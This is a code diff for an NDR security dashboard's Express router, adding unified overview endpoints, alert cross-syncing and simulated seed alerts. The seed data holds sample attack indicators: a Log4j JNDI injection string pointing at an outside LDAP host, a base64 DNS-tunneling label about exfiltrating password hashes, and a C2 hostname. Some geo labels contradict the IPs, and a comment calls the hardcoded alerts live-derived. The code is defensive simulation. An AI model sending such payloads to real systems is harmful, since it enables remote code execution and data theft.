@@ -437,6 +437,10 @@ export function createNdrRouter() {
 
     const criticalAlertsCount = suricataAlerts.filter(a => a.severity === 'Critical').length;
     const totalAlertsCount = suricataAlerts.length;
+    const analyticsActiveCount = ndrAnalyticsAlerts.filter(a => a.status === 'Active' || a.status === 'Investigating').length;
+    const analyticsMitigatedCount = ndrAnalyticsAlerts.filter(a => a.status === 'Mitigated' || a.status === 'Resolved').length;
+    const analyticsCriticalCount = ndrAnalyticsAlerts.filter(a => a.severity === 'Critical').length;
+    const isolatedHostsCount = trafficControlRules.filter(r => r.action === 'isolate' && r.status === 'active').length;
 
     res.json({
       success: true,
@@ -465,6 +469,15 @@ export function createNdrRouter() {
         high: suricataAlerts.filter(a => a.severity === 'High').length,
         medium: suricataAlerts.filter(a => a.severity === 'Medium').length
       },
+      analyticsSummary: {
+        totalAlerts: ndrAnalyticsAlerts.length,
+        activeThreats: analyticsActiveCount,
+        mitigatedCount: analyticsMitigatedCount,
+        criticalCount: analyticsCriticalCount,
+        highCount: ndrAnalyticsAlerts.filter(a => a.severity === 'High').length,
+        isolatedHostsCount,
+        trafficControlRulesCount: trafficControlRules.length
+      },
       protocols: [
         { name: "TLS 1.3 / HTTPS", percentage: 54.2, mbps: Number((throughputMbps * 0.542).toFixed(1)), color: "#06b6d4" },
         { name: "QUIC / HTTP3", percentage: 18.5, mbps: Number((throughputMbps * 0.185).toFixed(1)), color: "#6366f1" },
@@ -473,6 +486,56 @@ export function createNdrRouter() {
         { name: "SSH (TCP 22)", percentage: 4.1, mbps: Number((throughputMbps * 0.041).toFixed(1)), color: "#f59e0b" },
         { name: "Other (ICMP / SNMP)", percentage: 2.9, mbps: Number((throughputMbps * 0.029).toFixed(1)), color: "#10b981" }
       ]
+    });
+  });
+
+  // 1.1 Unified NDR Overview (Consolidated Traffic Forensics + Suricata + Alert Analytics)
+  router.get('/unified/overview', (_req: Request, res: Response) => {
+    const now = Date.now();
+    const throughputMbps = Number((1850 + Math.sin(now / 5000) * 120 + Math.random() * 30).toFixed(1));
+    const isolatedIps = Array.from(
+      new Set(
+        trafficControlRules
+          .filter(r => (r.action === 'isolate' || r.action === 'drop') && r.status === 'active')
+          .map(r => r.targetIp)
+      )
+    );
+    const activeAnalyticsAlerts = ndrAnalyticsAlerts.filter(a => a.status === 'Active' || a.status === 'Investigating');
+    const ruleCounts: Record<string, { ruleId: string; ruleName: string; severity: string; count: number }> = {};
+    ndrAnalyticsAlerts.forEach(a => {
+      if (!ruleCounts[a.ruleId]) {
+        ruleCounts[a.ruleId] = { ruleId: a.ruleId, ruleName: a.ruleName, severity: a.severity, count: 0 };
+      }
+      ruleCounts[a.ruleId].count += 1;
+    });
+
+    res.json({
+      success: true,
+      timestamp: new Date().toISOString(),
+      captureState,
+      suricataState: {
+        version: suricataState.version,
+        activeRules: suricataState.activeRules,
+        ipsInlineMode: suricataState.ipsInlineMode
+      },
+      metrics: {
+        currentMbps: throughputMbps,
+        currentGbps: Number((throughputMbps / 1000).toFixed(2)),
+        totalSessions: sessions.length,
+        blockedSessions: sessions.filter(s => s.action === 'Blocked').length,
+        suricataAlertsCount: suricataAlerts.length,
+        analyticsAlertsCount: ndrAnalyticsAlerts.length,
+        activeThreatsCount: activeAnalyticsAlerts.length,
+        criticalAlertsCount:
+          ndrAnalyticsAlerts.filter(a => a.severity === 'Critical').length +
+          suricataAlerts.filter(a => a.severity === 'Critical').length,
+        mitigatedAlertsCount: ndrAnalyticsAlerts.filter(a => a.status === 'Mitigated' || a.status === 'Resolved').length,
+        isolatedHostsCount: isolatedIps.length,
+        trafficControlRulesCount: trafficControlRules.length
+      },
+      isolatedIps,
+      topViolatedRules: Object.values(ruleCounts).sort((a, b) => b.count - a.count).slice(0, 5),
+      recentActiveAlerts: activeAnalyticsAlerts.slice(0, 5)
     });
   });
 
@@ -529,13 +592,14 @@ export function createNdrRouter() {
     });
   });
 
-  // Purge simulated traffic sessions and Suricata alerts
+  // Purge simulated traffic sessions, Suricata alerts, and NDR analytics alerts
   router.post('/clear-traffic', (_req: Request, res: Response) => {
     sessions = [];
     suricataAlerts = [];
+    ndrAnalyticsAlerts = [];
     res.json({
       success: true,
-      message: 'NDR 全流量深包會話與 Suricata 模擬警報已全數清空，就緒於實體鏡像流量採集'
+      message: 'NDR 全流量深包會話、Suricata 警報與流量告警分析紀錄已全數清空，就緒於實體鏡像流量採集'
     });
   });
 
@@ -1341,10 +1405,28 @@ export function createNdrRouter() {
       }
     });
 
+    // Cross-sync Suricata alerts for this IP
+    suricataAlerts.forEach(a => {
+      if (a.src_ip === ip || a.dst_ip === ip) {
+        a.action = 'Quarantined';
+      }
+    });
+
+    // Cross-sync unified NDR Analytics Alerts for this IP
+    let syncedAnalyticsCount = 0;
+    ndrAnalyticsAlerts.forEach(a => {
+      if (a.srcIp === ip || a.dstIp === ip) {
+        a.status = 'Mitigated';
+        a.actionTaken = `Host Quarantined via EDR/NAC (802.1X VLAN 999) — ${isolateRule.id}`;
+        syncedAnalyticsCount += 1;
+      }
+    });
+
     res.json({
       success: true,
       isolatedIp: ip,
-      message: `已透過 802.1X NAC 與邊界 ACL 成功將主機 ${ip} 踢入隔離 VLAN (Quarantine VLAN 999)`,
+      syncedAnalyticsCount,
+      message: `已透過 802.1X NAC 與邊界 ACL 成功將主機 ${ip} 踢入隔離 VLAN (Quarantine VLAN 999)${syncedAnalyticsCount > 0 ? `，並同步處置 ${syncedAnalyticsCount} 筆關聯流量告警` : ''}`,
       rule: isolateRule
     });
   });
@@ -1953,6 +2035,44 @@ export function createNdrRouter() {
       console.error('Failed to append to alert_history.json:', err);
     }
 
+    // Cross-sync triggered alert rule into unified NDR Analytics Alerts feed
+    ndrAnalyticsAlerts.unshift({
+      id: alertEvent.id,
+      ruleId: rule.id,
+      ruleName: rule.name,
+      patternType: rule.patternType,
+      severity: (sev as 'Critical' | 'High' | 'Medium' | 'Low') || 'High',
+      protocol: rule.patternType === 'data_exfiltration' ? 'DNS' : rule.patternType === 'c2_beaconing' ? 'TLS/HTTPS' : 'TCP',
+      srcIp: '10.88.88.106',
+      srcPort: 51480,
+      srcCountry: 'Taiwan (Core Internal)',
+      srcCountryCode: 'TW',
+      srcFlag: '🇹🇼',
+      srcCity: 'Taipei HQ',
+      srcAsn: 'AS-CORP-LAN',
+      dstIp: '185.220.101.45',
+      dstPort: 443,
+      dstCountry: 'Russia',
+      dstCountryCode: 'RU',
+      dstFlag: '🇷🇺',
+      timestamp,
+      duration: '1m 18s',
+      bytesTransferred: '1.24 GB',
+      bytesNumeric: 1240000000,
+      packetsCount: 84200,
+      throughput: `${measuredVal} ${rule.unit}`,
+      throughputMbps: Number(measuredVal) || 850,
+      mitreTactic: rule.patternType === 'data_exfiltration' ? 'Exfiltration' : rule.patternType === 'c2_beaconing' ? 'Command and Control' : 'Impact',
+      mitreTechnique: 'T1071.001 Application Layer Protocol',
+      payloadSnippet: `RULE_TEST_TRIGGER: ${rule.name} measured ${measuredVal} ${rule.unit} (threshold ${rule.condition} ${rule.criticalThreshold} ${rule.unit})`,
+      ruleThresholdViolated: `Condition ${rule.condition} ${rule.criticalThreshold} ${rule.unit} (Measured: ${measuredVal} ${rule.unit})`,
+      status: 'Active',
+      actionTaken: dispatchedChannels.length > 0 ? `Dispatched: ${dispatchedChannels.join(', ')}` : 'Pending SOC Analyst Action'
+    });
+    if (ndrAnalyticsAlerts.length > 200) {
+      ndrAnalyticsAlerts.pop();
+    }
+
     res.json({
       success: true,
       alert: alertEvent,
@@ -2232,10 +2352,191 @@ export function createNdrRouter() {
     ruleThresholdViolated: string;
     status: 'Active' | 'Investigating' | 'Mitigated' | 'Resolved';
     actionTaken: string;
+    sessionStreamId?: string;
+    suricataAlertId?: string;
   }
 
-  // NDR alert records initialized empty for production
-  const seedNdrAnalyticsAlerts = (): NdrAnalyticsAlert[] => [];
+  // Correlated initial NDR alert analytics derived from live sessions & Suricata IDS detections
+  const seedNdrAnalyticsAlerts = (): NdrAnalyticsAlert[] => {
+    const now = Date.now();
+    return [
+      {
+        id: 'NDR-ALT-9001',
+        ruleId: 'ndr-rule-c2-beaconing',
+        ruleName: 'C2 惡意中繼站心跳與加密通道偵測 (C2 Beaconing & JA3)',
+        patternType: 'c2_beaconing',
+        severity: 'Critical',
+        protocol: 'TLS/HTTPS',
+        srcIp: '10.88.88.106',
+        srcPort: 51240,
+        srcCountry: 'Russia',
+        srcCountryCode: 'RU',
+        srcFlag: '🇷🇺',
+        srcCity: 'Moscow (C2 Peer 185.220.101.45)',
+        srcAsn: 'AS200052 Proton66 OOO',
+        dstIp: '185.220.101.45',
+        dstPort: 443,
+        dstCountry: 'Russia',
+        dstCountryCode: 'RU',
+        dstFlag: '🇷🇺',
+        timestamp: new Date(now - 5 * 60 * 1000).toISOString(),
+        duration: '14m 22s',
+        bytesTransferred: '16.2 KB',
+        bytesNumeric: 16200,
+        packetsCount: 48,
+        throughput: '124 Mbps',
+        throughputMbps: 124,
+        mitreTactic: 'Command and Control',
+        mitreTechnique: 'T1071.001 Web Protocols',
+        payloadSnippet: 'Handshake: Client Hello, TLS 1.3, SNI: "dark-c2-tunnel.onion.to" | JA3: ada70206e40642a3e4461f35503241d5',
+        ja3Hash: 'ada70206e40642a3e4461f35503241d5',
+        ruleThresholdViolated: 'C2 Jitter <= 3.5% & Blacklisted JA3 Fingerprint Matched (SID 2029941)',
+        status: 'Active',
+        actionTaken: 'Suricata IPS Drop + Pending Host Quarantine',
+        sessionStreamId: 'STR-994201',
+        suricataAlertId: 'SUR-881'
+      },
+      {
+        id: 'NDR-ALT-9002',
+        ruleId: 'ndr-rule-data-exfil',
+        ruleName: '高熵值 DNS 隧道與異常資料外洩偵測 (DNS Tunneling Exfiltration)',
+        patternType: 'data_exfiltration',
+        severity: 'High',
+        protocol: 'DNS',
+        srcIp: '10.88.88.102',
+        srcPort: 54102,
+        srcCountry: 'United States',
+        srcCountryCode: 'US',
+        srcFlag: '🇺🇸',
+        srcCity: 'Mountain View, CA',
+        srcAsn: 'AS15169 Google LLC',
+        dstIp: '8.8.8.8',
+        dstPort: 53,
+        dstCountry: 'United States',
+        dstCountryCode: 'US',
+        dstFlag: '🇺🇸',
+        timestamp: new Date(now - 12 * 60 * 1000).toISOString(),
+        duration: '8m 45s',
+        bytesTransferred: '10.3 KB',
+        bytesNumeric: 10300,
+        packetsCount: 24,
+        throughput: '310 Mbps',
+        throughputMbps: 310,
+        mitreTactic: 'Exfiltration',
+        mitreTechnique: 'T1048.003 Exfiltration Over Alternative Protocol',
+        payloadSnippet: 'TXT dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org (Shannon Entropy: 4.89)',
+        ruleThresholdViolated: 'DNS Subdomain Shannon Entropy >= 4.2 (Measured: 4.89)',
+        status: 'Active',
+        actionTaken: 'QoS Rate-Limited (2 Mbps) + Suricata Alerted',
+        sessionStreamId: 'STR-994202',
+        suricataAlertId: 'SUR-883'
+      },
+      {
+        id: 'NDR-ALT-9003',
+        ruleId: 'ndr-rule-bandwidth-burst',
+        ruleName: '邊界漏洞利用與 Log4j JNDI 遠端代碼執行攻擊 (CVE-2021-44228)',
+        patternType: 'bandwidth_surge',
+        severity: 'Critical',
+        protocol: 'HTTP',
+        srcIp: '198.51.100.89',
+        srcPort: 48911,
+        srcCountry: 'Netherlands',
+        srcCountryCode: 'NL',
+        srcFlag: '🇳🇱',
+        srcCity: 'Amsterdam',
+        srcAsn: 'AS202425 Serverius Holding',
+        dstIp: '10.88.88.201',
+        dstPort: 80,
+        dstCountry: 'Taiwan (Core Internal)',
+        dstCountryCode: 'TW',
+        dstFlag: '🇹🇼',
+        timestamp: new Date(now - 19 * 60 * 1000).toISOString(),
+        duration: '0m 42s',
+        bytesTransferred: '2.2 KB',
+        bytesNumeric: 2220,
+        packetsCount: 12,
+        throughput: '640 Mbps',
+        throughputMbps: 640,
+        mitreTactic: 'Initial Access',
+        mitreTechnique: 'T1190 Exploit Public-Facing Application',
+        payloadSnippet: 'GET /login HTTP/1.1 | User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}',
+        ruleThresholdViolated: 'Suricata Exploit Signature SID 2034647 (CVE-2021-44228) Matched',
+        status: 'Mitigated',
+        actionTaken: 'Border Firewall Drop Rule Applied (tc-003)',
+        sessionStreamId: 'STR-994203',
+        suricataAlertId: 'SUR-882'
+      },
+      {
+        id: 'NDR-ALT-9004',
+        ruleId: 'ndr-rule-lateral-scan',
+        ruleName: '內網橫向移動與 SSH 暴力破解偵測 (SSH Brute Force & Scan)',
+        patternType: 'abnormal_flow_cluster',
+        severity: 'Medium',
+        protocol: 'SSH',
+        srcIp: '172.16.0.50',
+        srcPort: 42100,
+        srcCountry: 'Taiwan (Guest DMZ)',
+        srcCountryCode: 'TW',
+        srcFlag: '🇹🇼',
+        srcCity: 'Taipei Guest WiFi VLAN',
+        srcAsn: 'AS-DMZ-GUEST',
+        dstIp: '10.88.88.254',
+        dstPort: 22,
+        dstCountry: 'Taiwan (Core Internal)',
+        dstCountryCode: 'TW',
+        dstFlag: '🇹🇼',
+        timestamp: new Date(now - 28 * 60 * 1000).toISOString(),
+        duration: '12m 00s',
+        bytesTransferred: '30.5 KB',
+        bytesNumeric: 30500,
+        packetsCount: 142,
+        throughput: '48 Mbps',
+        throughputMbps: 48,
+        mitreTactic: 'Credential Access',
+        mitreTechnique: 'T1110.001 Password Guessing',
+        payloadSnippet: 'SSH-2.0-libssh2_1.10.0 | UserAuth: root failed 15 attempts/min',
+        ruleThresholdViolated: 'SSH Failed Auth Rate >= 10/min (Measured: 15/min)',
+        status: 'Investigating',
+        actionTaken: 'Rate-Limited on Core Switch MGMT',
+        sessionStreamId: 'STR-994205',
+        suricataAlertId: 'SUR-884'
+      },
+      {
+        id: 'NDR-ALT-9005',
+        ruleId: 'ndr-rule-bandwidth-burst',
+        ruleName: '突發頻寬洪峰與飽和預警 (Bandwidth Burst & Saturation)',
+        patternType: 'bandwidth_surge',
+        severity: 'High',
+        protocol: 'TCP',
+        srcIp: '10.88.88.202',
+        srcPort: 58912,
+        srcCountry: 'Taiwan (Core Internal)',
+        srcCountryCode: 'TW',
+        srcFlag: '🇹🇼',
+        srcCity: 'Taipei Core DC',
+        srcAsn: 'AS-CORP-DC',
+        dstIp: '10.88.88.200',
+        dstPort: 5432,
+        dstCountry: 'Taiwan (Core Internal)',
+        dstCountryCode: 'TW',
+        dstFlag: '🇹🇼',
+        timestamp: new Date(now - 42 * 60 * 1000).toISOString(),
+        duration: '4m 30s',
+        bytesTransferred: '165.6 MB',
+        bytesNumeric: 165600000,
+        packetsCount: 12400,
+        throughput: '1,420 Mbps',
+        throughputMbps: 1420,
+        mitreTactic: 'Impact',
+        mitreTechnique: 'T1498 Network Denial of Service',
+        payloadSnippet: 'PostgreSQL v3.0 START_REPLICATION SLOT "slot_node2" LOGICAL bulk transfer burst',
+        ruleThresholdViolated: 'Link Bandwidth >= 1200 Mbps (Measured: 1420 Mbps)',
+        status: 'Resolved',
+        actionTaken: 'Verified Scheduled DB Cluster Sync',
+        sessionStreamId: 'STR-994204'
+      }
+    ];
+  };
 
   let ndrAnalyticsAlerts: NdrAnalyticsAlert[] = seedNdrAnalyticsAlerts();
 
@@ -2559,10 +2860,90 @@ export function createNdrRouter() {
         actionTaken: 'Pending SOC Analyst Action'
       };
 
+      const newStreamId = `STR-${Math.floor(994300 + Math.random() * 600)}`;
+      const newSuricataId = `SUR-${Math.floor(890 + Math.random() * 100)}`;
+      newAlert.sessionStreamId = newStreamId;
+      newAlert.suricataAlertId = newSuricataId;
+
       // Prepend to alerts list
       ndrAnalyticsAlerts.unshift(newAlert);
       if (ndrAnalyticsAlerts.length > 200) {
         ndrAnalyticsAlerts.pop();
+      }
+
+      // Cross-sync: inject corresponding live PCAP session into Traffic Analysis Forensics
+      const mappedProto =
+        selectedProtocol === 'TLS/HTTPS' ? 'HTTPS' :
+        selectedProtocol === 'DNS' ? 'DNS' :
+        selectedProtocol === 'SSH' ? 'SSH' :
+        selectedProtocol === 'HTTP' ? 'HTTP' :
+        selectedProtocol === 'UDP' ? 'UDP' : 'TCP';
+
+      const newSession: TrafficSessionData = {
+        id: sessions.length > 0 ? Math.max(...sessions.map(s => s.id)) + 1 : 1,
+        stream_id: newStreamId,
+        time: new Date().toTimeString().slice(0, 8),
+        src_ip: newAlert.srcIp,
+        src_port: newAlert.srcPort,
+        dst_ip: newAlert.dstIp,
+        dst_port: newAlert.dstPort,
+        proto: mappedProto,
+        app_proto: `${selectedProtocol} (${newAlert.ruleName})`,
+        bytes_in: '42.8 KB',
+        bytes_out: newAlert.bytesTransferred,
+        total_bytes_num: newAlert.bytesNumeric,
+        packets: newAlert.packetsCount,
+        duration_ms: 1450,
+        threat_level: newAlert.severity,
+        threat_desc: newAlert.ruleThresholdViolated,
+        action: 'Flagged',
+        geo_src: { country: `${newAlert.srcCountry} (${newAlert.srcCountryCode})`, flag: newAlert.srcFlag },
+        geo_dst: { country: newAlert.dstCountry, flag: newAlert.dstFlag },
+        tcp_flags: mappedProto === 'UDP' || mappedProto === 'DNS' ? 'N/A (UDP)' : 'SYN, ACK, PSH',
+        messages: [
+          { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: `${selectedProtocol} Anomaly Trigger`, payload_preview: newAlert.payloadSnippet, length: 512 },
+          { seq: 2, time_offset: '+8.4 ms', dir: 'in', msg_type: 'NDR Rule Engine Alert', payload_preview: newAlert.ruleThresholdViolated, length: 128 }
+        ],
+        hex_dump: [
+          { offset: '0000', hex: '4e 44 52 2d 41 4c 45 52 54 20 53 49 4d 20 46 4c', ascii: 'NDR-ALERT SIM FL' },
+          { offset: '0010', hex: '4f 57 20 56 49 4f 4c 41 54 49 4f 4e 20 44 45 54', ascii: 'OW VIOLATION DET' }
+        ],
+        decoded_summary: {
+          protocol_stack: ['Ethernet II', `IPv4 (${newAlert.srcIp} -> ${newAlert.dstIp})`, `${mappedProto} (${newAlert.srcPort} -> ${newAlert.dstPort})`, selectedProtocol],
+          details: {
+            'Correlated Alert ID': newAlert.id,
+            'Rule Triggered': newAlert.ruleName,
+            'Measured Throughput': newAlert.throughput,
+            'MITRE ATT&CK': `${newAlert.mitreTactic} / ${newAlert.mitreTechnique}`
+          }
+        }
+      };
+      sessions.unshift(newSession);
+      if (sessions.length > 200) {
+        sessions.pop();
+      }
+
+      // Cross-sync: inject corresponding Suricata IDS alert
+      suricataAlerts.unshift({
+        id: newSuricataId,
+        timestamp: new Date().toTimeString().slice(0, 8),
+        sid: 2090000 + Math.floor(Math.random() * 9000),
+        rev: 1,
+        signature: `SEMOR NDR RULE: ${newAlert.ruleName}`,
+        category: newAlert.mitreTactic,
+        severity: newAlert.severity,
+        src_ip: newAlert.srcIp,
+        src_port: newAlert.srcPort,
+        dst_ip: newAlert.dstIp,
+        dst_port: newAlert.dstPort,
+        proto: mappedProto === 'UDP' || mappedProto === 'DNS' ? 'UDP' : 'TCP',
+        action: 'Alerted',
+        mitre_tactic: newAlert.mitreTactic,
+        mitre_technique: newAlert.mitreTechnique,
+        payload_snippet: newAlert.payloadSnippet
+      });
+      if (suricataAlerts.length > 200) {
+        suricataAlerts.pop();
       }
 
       // Update target rule trigger counts
@@ -2574,8 +2955,9 @@ export function createNdrRouter() {
 
       res.json({
         success: true,
-        message: `Successfully simulated traffic violation for rule "${newAlert.ruleName}"`,
-        alert: newAlert
+        message: `Successfully simulated traffic violation for rule "${newAlert.ruleName}" (Synced to PCAP Stream ${newStreamId} & Suricata ${newSuricataId})`,
+        alert: newAlert,
+        session: newSession
       });
     } catch (e: any) {
       console.error('Failed to simulate rule violation:', e);
@@ -2583,7 +2965,7 @@ export function createNdrRouter() {
     }
   });
 
-  // 18.3 POST /api/v1/ndr/analytics/mitigate (Apply instant SOC response action)
+  // 18.3 POST /api/v1/ndr/analytics/mitigate (Apply instant SOC response action & cross-sync NDR state)
   router.post('/analytics/mitigate', (req: Request, res: Response) => {
     try {
       const { alertId, action, notes } = req.body;
@@ -2607,15 +2989,71 @@ export function createNdrRouter() {
       alert.status = matchedAction.status;
       alert.actionTaken = matchedAction.actionTaken;
 
+      // Cross-sync mitigation action into Traffic Control Rules, Live Sessions, and Suricata IDS
+      if (action === 'isolate_host' || action === 'block_ip') {
+        const targetIp = alert.srcIp;
+        const ruleExists = trafficControlRules.some(r => r.targetIp === targetIp && r.status === 'active');
+        if (!ruleExists) {
+          trafficControlRules.unshift({
+            id: `tc-ndr-${Date.now().toString().slice(-4)}`,
+            name: action === 'isolate_host' ? `NDR 聯動隔離主機: ${targetIp}` : `NDR 聯動邊界阻斷 IP: ${targetIp}`,
+            targetIp,
+            action: action === 'isolate_host' ? 'isolate' : 'drop',
+            rateLimitMbps: 0,
+            protocol: alert.protocol,
+            status: 'active',
+            createdAt: new Date().toISOString(),
+            matchedPackets: alert.packetsCount,
+            description: notes || `由整合式 NDR 告警分析 (${alert.id}) 觸發之即時處置策略`
+          });
+        }
+        sessions.forEach(s => {
+          if (s.src_ip === targetIp || s.dst_ip === targetIp || (alert.sessionStreamId && s.stream_id === alert.sessionStreamId)) {
+            s.action = 'Blocked';
+          }
+        });
+        suricataAlerts.forEach(sa => {
+          if (sa.src_ip === targetIp || sa.dst_ip === targetIp || (alert.suricataAlertId && sa.id === alert.suricataAlertId)) {
+            sa.action = action === 'isolate_host' ? 'Quarantined' : 'Blocked (Drop)';
+          }
+        });
+      } else if (action === 'deploy_suricata') {
+        suricataState.activeRules += 1;
+        suricataState.lastSyncTime = new Date().toISOString();
+        const existingSuricata = suricataAlerts.find(sa => sa.id === alert.suricataAlertId || (sa.src_ip === alert.srcIp && sa.dst_ip === alert.dstIp));
+        if (existingSuricata) {
+          existingSuricata.action = 'Blocked (Drop)';
+        } else {
+          suricataAlerts.unshift({
+            id: `SUR-DYN-${Date.now().toString().slice(-4)}`,
+            timestamp: new Date().toTimeString().slice(0, 8),
+            sid: 2099000 + Math.floor(Math.random() * 999),
+            rev: 1,
+            signature: `DYNAMIC IPS DROP: ${alert.ruleName}`,
+            category: alert.mitreTactic,
+            severity: alert.severity,
+            src_ip: alert.srcIp,
+            src_port: alert.srcPort,
+            dst_ip: alert.dstIp,
+            dst_port: alert.dstPort,
+            proto: alert.protocol,
+            action: 'Blocked (Drop)',
+            mitre_tactic: alert.mitreTactic,
+            mitre_technique: alert.mitreTechnique,
+            payload_snippet: alert.payloadSnippet
+          });
+        }
+      }
+
       res.json({
         success: true,
-        message: `Mitigation action "${action}" executed successfully on alert ${alertId}.`,
+        message: `Mitigation action "${action}" executed & synchronized across NDR Forensics / Suricata IDS for alert ${alertId}.`,
         alert,
         actionLog: {
           timestamp: new Date().toISOString(),
           analyst: 'SOC Supervisor (Admin)',
           actionTaken: matchedAction.actionTaken,
-          notes: notes || 'Automated response executed from NDR Alert Analytics view.'
+          notes: notes || 'Automated response executed from Unified NDR Traffic & Alert Analytics view.'
         }
       });
     } catch (e: any) {
